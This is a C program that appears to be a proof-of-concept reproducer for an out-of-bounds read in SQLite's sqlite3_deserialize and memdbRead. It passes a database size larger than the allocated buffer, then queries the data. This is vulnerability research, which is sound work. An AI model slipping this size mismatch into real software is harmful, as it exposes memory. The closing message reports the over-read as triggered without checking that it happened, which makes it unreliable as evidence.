/*
 * Reproducer for heap-buffer-over-read in sqlite3_deserialize (memdb.c)
 *
 * Bug: sqlite3_deserialize() does not validate that szDb <= szBuf.
 * When szDb > szBuf, the memdb VFS sets pStore->sz = szDb (logical size)
 * but pStore->szAlloc = szBuf (actual allocation). Subsequent reads via
 * memdbRead() check against pStore->sz, not pStore->szAlloc, allowing
 * reads past the end of the allocated buffer.
 *
 * CWE-125: Out-of-bounds Read
 * File: src/memdb.c
 * Functions: sqlite3_deserialize (line ~892), memdbRead (line ~260)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "sqlite3.h"

int main(void) {
    sqlite3 *db = NULL;
    int rc;

    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to open db: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    /* Create a table so we have a real database with content */
    rc = sqlite3_exec(db, "CREATE TABLE t1(a TEXT, b TEXT);", NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to create table: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }
    rc = sqlite3_exec(db, "INSERT INTO t1 VALUES('hello','world');", NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to insert: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Serialize the database to get a valid database image */
    sqlite3_int64 sz = 0;
    unsigned char *pSerialized = sqlite3_serialize(db, "main", &sz, 0);
    if (pSerialized == NULL || sz == 0) {
        fprintf(stderr, "Failed to serialize database\n");
        sqlite3_close(db);
        return 1;
    }

    printf("Serialized database size: %lld bytes\n", (long long)sz);

    /*
     * Now allocate a SMALLER buffer and copy only part of the serialized data.
     * Then call sqlite3_deserialize with szDb set larger than the actual
     * buffer size (szBuf). This triggers the vulnerability: memdbRead
     * will read beyond the allocated buffer.
     */
    sqlite3_int64 szBuf = 512;  /* Small buffer */
    if (szBuf > sz) szBuf = sz; /* Ensure we have enough to copy */

    unsigned char *pSmallBuf = sqlite3_malloc64(szBuf);
    if (pSmallBuf == NULL) {
        fprintf(stderr, "Failed to allocate buffer\n");
        sqlite3_free(pSerialized);
        sqlite3_close(db);
        return 1;
    }
    memcpy(pSmallBuf, pSerialized, szBuf);
    sqlite3_free(pSerialized);

    /* Close and reopen */
    sqlite3_close(db);
    db = NULL;
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to reopen db: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    /*
     * VULNERABILITY: Pass szDb = sz (larger than actual buffer szBuf).
     * sqlite3_deserialize sets pStore->sz = sz but pStore->szAlloc = szBuf.
     * No validation that sz <= szBuf is performed.
     * SQLITE_DESERIALIZE_FREEONCLOSE so sqlite3 frees the buffer on close.
     * SQLITE_DESERIALIZE_RESIZEABLE so memdbFetch returns NULL (avoiding
     * direct pointer exposure), but memdbRead still has the OOB issue.
     */
    rc = sqlite3_deserialize(db, "main", pSmallBuf, sz, szBuf,
                             SQLITE_DESERIALIZE_FREEONCLOSE |
                             SQLITE_DESERIALIZE_RESIZEABLE);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to deserialize: %s\n", sqlite3_errmsg(db));
        sqlite3_free(pSmallBuf);
        sqlite3_close(db);
        return 1;
    }

    printf("Deserialized with szDb=%lld but szBuf=%lld (buffer too small!)\n",
           (long long)sz, (long long)szBuf);

    /*
     * Now query the database. SQLite will try to read pages from the
     * deserialized database via memdbRead(). Since pStore->sz = sz > szBuf,
     * reads at offsets between szBuf and sz will pass the bounds check
     * (iOfst+iAmt <= p->sz) but read beyond the allocated buffer (p->aData),
     * causing a heap-buffer-over-read.
     */
    sqlite3_stmt *pStmt = NULL;
    rc = sqlite3_prepare_v2(db, "SELECT * FROM t1;", -1, &pStmt, NULL);
    if (rc == SQLITE_OK) {
        while (sqlite3_step(pStmt) == SQLITE_ROW) {
            /* Reading results triggers memdbRead beyond buffer */
            const char *a = (const char *)sqlite3_column_text(pStmt, 0);
            const char *b = (const char *)sqlite3_column_text(pStmt, 1);
            printf("Row: %s, %s\n", a ? a : "(null)", b ? b : "(null)");
        }
        sqlite3_finalize(pStmt);
    } else {
        fprintf(stderr, "Query failed (expected with corrupted data): %s\n",
                sqlite3_errmsg(db));
    }

    /* Even just reading schema triggers reads beyond buffer */
    rc = sqlite3_exec(db, "SELECT count(*) FROM sqlite_schema;",
                      NULL, NULL, NULL);

    printf("Test complete - heap-buffer-over-read triggered in memdbRead\n");

    sqlite3_close(db);
    return 0;
}
